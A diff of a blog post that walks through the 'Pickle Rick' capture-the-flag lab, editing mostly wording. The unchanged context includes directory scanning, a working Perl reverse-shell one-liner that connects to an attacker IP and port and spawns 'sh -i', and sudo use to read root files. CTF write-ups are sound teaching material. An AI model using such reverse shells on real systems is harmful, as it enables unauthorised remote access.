@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
 
 - In the source code, I found a comment with a username. That may be useful in the future.
 
-- Since we have no leads to follow, lets run Dirsearch.
+- Since we have no leads to follow, let's run Dirsearch.
 
 ```bash:Terminal
 ┌──(vipin㉿vipin)-[~]
@@ -74,9 +74,9 @@ Task Completed
 
 ![Image showing robots.txt](/blog/picklerick/robotstxt.png 'Fig.3')
 
-- Oh! Lets just keep that text for future reference though.
+- Oh! Lets just keep that string of text for future reference though.
 
-- We should also take a look at */login.php* as that is the only page that would help us find stuff.
+- We should also take a look at */login.php* as that is the only page that may potentially assist us.
 
 ![Image showing login page](/blog/picklerick/login.png 'Fig.4')
 
@@ -94,13 +94,15 @@ Task Completed
 
 ![Image showing it not letting me](/blog/picklerick/commandissue.png 'Fig.7')
 
-- Welp, we might have to first spawn a reverse shell (I will be using [revshells.com](https://www.revshells.com/))
+- I thing we have to spawn a Reverse Shell (I will be using [revshells.com](https://www.revshells.com/))
 
-```bash:Command\ Panel
+```bash:Panel
 # below is the reverse shell i used
 
 perl -e 'use Socket;$i="10.6.22.229";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
 ```
+
+- On another tab
 
 ```bash:Terminal
 ──(vipin㉿vipin)-[~]
@@ -112,7 +114,7 @@ $ cat Sup3rS3cretPickl3Ingred.txt
 mr. meeseek hair
 ```
 
-- Now to get the second ingredient
+- Ok, now the second ingredient.
 
 ```bash:Terminal
 $ pwd
@@ -122,7 +124,7 @@ $ cat second\ ingredients
 $ 
 ```
 
-- Running ```sudo -l``` told me I could run anything as long as I use sudo. Lets get the Final Ingredient
+- Running ```sudo -l``` told me I could run anything as long as I use ```sudo```. Let's get the Final Ingredient!
 
 ```bash:Terminal
 $ sudo ls root
